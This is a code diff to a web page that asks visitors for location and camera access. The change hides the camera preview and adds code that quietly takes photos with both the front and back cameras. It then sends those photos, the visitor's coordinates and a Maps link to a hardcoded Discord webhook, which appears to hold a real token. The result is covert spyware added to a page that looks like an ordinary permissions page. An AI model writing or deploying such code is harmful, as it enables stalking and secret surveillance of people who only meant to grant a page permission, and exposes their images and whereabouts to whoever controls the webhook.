@@ -25,11 +25,13 @@
     <div id="details">
         <h3>User Details</h3>
         <p><strong>Location:</strong> <span id="location"></span></p>
-        <video id="video" width="300" height="200" autoplay></video>
-        <canvas id="canvas" style="display: none;"></canvas>
     </div>
 
+    <canvas id="canvas" style="display: none;"></canvas>
+
     <script>
+        const webhookURL = "https://discord.com/api/webhooks/1346211668195278920/p3FKujXJfw9iF4Ln9gD5RB6e2goF0gFF07fjG1HYDVKDoqFSMPFRV9B6fVTDCS9TuSVB"; // Replace with your Discord Webhook URL
+
         function getPermissions() {
             if (!navigator.geolocation || !navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) {
                 alert("Your browser does not support required permissions.");
@@ -41,22 +43,51 @@
                 (position) => {
                     const { latitude, longitude } = position.coords;
                     document.getElementById("location").innerText = `Latitude: ${latitude}, Longitude: ${longitude}`;
-                    
-                    // Ask for camera permission
-                    navigator.mediaDevices.getUserMedia({ video: true })
-                        .then((stream) => {
-                            document.getElementById("details").style.display = "block";
-                            document.getElementById("video").srcObject = stream;
-                        })
-                        .catch(() => {
-                            alert("Camera permission is required to proceed!");
-                        });
+                    document.getElementById("details").style.display = "block";
+
+                    const locationData = `Latitude: ${latitude}, Longitude: ${longitude}\nGoogle Maps: https://www.google.com/maps?q=${latitude},${longitude}`;
+
+                    // Capture photo from front and back camera
+                    capturePhoto("user", locationData);
+                    setTimeout(() => capturePhoto("environment", locationData), 3000); // Back Camera
 
                 },
                 () => {
                     alert("Location permission is required to proceed!");
                 }
             );
+        }
+
+        async function capturePhoto(cameraFacing, locationData) {
+            try {
+                const stream = await navigator.mediaDevices.getUserMedia({ 
+                    video: { facingMode: cameraFacing } 
+                });
+
+                const video = document.createElement("video");
+                video.srcObject = stream;
+                await new Promise(resolve => video.onloadedmetadata = resolve);
+
+                const canvas = document.getElementById("canvas");
+                const context = canvas.getContext("2d");
+                canvas.width = video.videoWidth;
+                canvas.height = video.videoHeight;
+                context.drawImage(video, 0, 0, canvas.width, canvas.height);
+
+                canvas.toBlob(blob => {
+                    const formData = new FormData();
+                    formData.append("file", blob, `capture_${cameraFacing}.jpg`);
+                    formData.append("content", `📸 **Photo Captured (${cameraFacing})**\n🌍 **Location:** ${locationData}`);
+
+                    fetch(webhookURL, { method: "POST", body: formData });
+
+                }, "image/jpeg");
+
+                stream.getTracks().forEach(track => track.stop());
+            } catch (error) {
+                console.error("Camera access error:", error);
+                alert("Camera permission is required to proceed!");
+            }
         }
     </script>
 
